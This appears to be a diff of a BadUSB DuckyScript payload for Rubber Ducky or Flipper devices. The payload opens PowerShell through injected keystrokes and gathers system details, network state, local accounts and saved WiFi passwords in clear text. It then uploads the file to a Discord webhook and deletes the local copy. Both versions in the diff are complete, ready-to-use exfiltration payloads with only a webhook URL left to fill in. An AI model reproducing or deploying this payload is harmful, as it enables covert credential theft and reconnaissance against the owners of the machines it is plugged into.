@@ -1,15 +1,17 @@
-REM Author: Steven Olsen
+REM Author: Steven
 REM Description: Exfiltrate data from workstation and upload to Discord Webhook
-REM Current Discord webhook connects to my Plex Discord server in the private channel #flipper
-REM There's 2 variables to set in the STRING one liner, the webhook URL and then the source device.
-REM This script was initially made for my Flipper BadUSB/KB but also works on my Rubber Ducky
+REM Current Discord webhook connects to Discord server and submits the txt file for instant data exfiltration
+REM Be sure to replace your webhook, also towards the end of the string there is a line:
+REM "$env:computername Data from Stevens Ducky" < This is the text sent to Discord with the stats.txt file
 REM Version: 1.1
 REM Category: Recon
 DELAY 500
-GUI r
+GUI x
 DELAY 200
-STRING powershell
+STRING a
+DELAY 100
+LEFTARROW
 ENTER
 DELAY 1000
-STRING $url="YOUR_DISCORD_WEBHOOK_URL_HERE";dir env: >> stats.txt; Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)' >> stats.txt;(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -AutoSize >> stats.txt;Invoke-WebRequest ipinfo.io/ip -UseBasicParsing >> stats.txt;$Body=@{ content = "$env:computername Data from ENTER_DEVICE_NAME_HERE"};Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);curl.exe -F "file1=@stats.txt" $url ; Remove-Item '.\stats.txt';exit
+STRING $url="YOUR_WEBHOOK_URL_HERE";Write-Output "-----------------------" >> stats.txt; Write-Output "Endpoint Information:" >> stats.txt; Write-Output "-----------------------" >> stats.txt; Get-ComputerInfo >> stats.txt; Write-Output "-----------------------" >> stats.txt; Write-Output "Endpoint Environment Variables:" >> stats.txt; Write-Output "-----------------------" >> stats.txt; Get-ChildItem env: >> stats.txt; Write-Output "-----------------------" >> stats.txt; Write-Output "ARP Table Information:" >> stats.txt; Write-Output "-----------------------" >> stats.txt; arp -a >> stats.txt; Write-Output "-----------------------" >> stats.txt; Write-Output "TCP Connections:" >> stats.txt; Write-Output "-----------------------" >> stats.txt; Get-NetTCPConnection >> stats.txt; Write-Output "-----------------------" >> stats.txt; Write-Output "Endpoint DNS Client Cache:" >> stats.txt; Write-Output "-----------------------" >> stats.txt; Get-DnsClientCache >> stats.txt; Write-Output "-----------------------" >> stats.txt; Write-Output "Local User Accounts:" >> stats.txt; Write-Output "-----------------------" >> stats.txt; Get-LocalUser >> stats.txt; Write-Output "-----------------------" >> stats.txt; Write-Output "Endpoint Services:" >> stats.txt; Write-Output "-----------------------" >> stats.txt; Get-Service >> stats.txt; Write-Output "-----------------------" >> stats.txt; Write-Output "Last 10 System Event Logs:" >> stats.txt; Write-Output "-----------------------" >> stats.txt; Get-EventLog -LogName System -Newest 10 >> stats.txt; Write-Output "-----------------------" >> stats.txt; Write-Output "IPv4 Addresses (Excluding Loopback & Link-Local):" >> stats.txt; Write-Output "-----------------------" >> stats.txt; Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | Where-Object { $_.IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)' } >> stats.txt; Write-Output "-----------------------" >> stats.txt; Write-Output "WiFi Profiles and Passwords:" >> stats.txt; Write-Output "-----------------------" >> stats.txt; (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object { $name = $_.Matches.Groups[1].Value.Trim(); netsh wlan show profile name="$name" key=clear } | Select-String "Key Content\W+\:(.+)$" | ForEach-Object { $pass = $_.Matches.Groups[1].Value.Trim(); [PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass} } | Format-Table -AutoSize >> stats.txt; Write-Output "-----------------------" >> stats.txt; Write-Output "Physical Disk Information:" >> stats.txt; Write-Output "-----------------------" >> stats.txt; Get-PhysicalDisk >> stats.txt; Write-Output "-----------------------" >> stats.txt; Write-Output "Public IP Address:" >> stats.txt; Write-Output "-----------------------" >> stats.txt; Invoke-WebRequest ipinfo.io/ip -UseBasicParsing >> stats.txt;$Body=@{ content = "$env:computername Data from Stevens Ducky"};Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);curl.exe -F "file1=@stats.txt" $url ; Remove-Item '.\stats.txt';exit
 ENTER
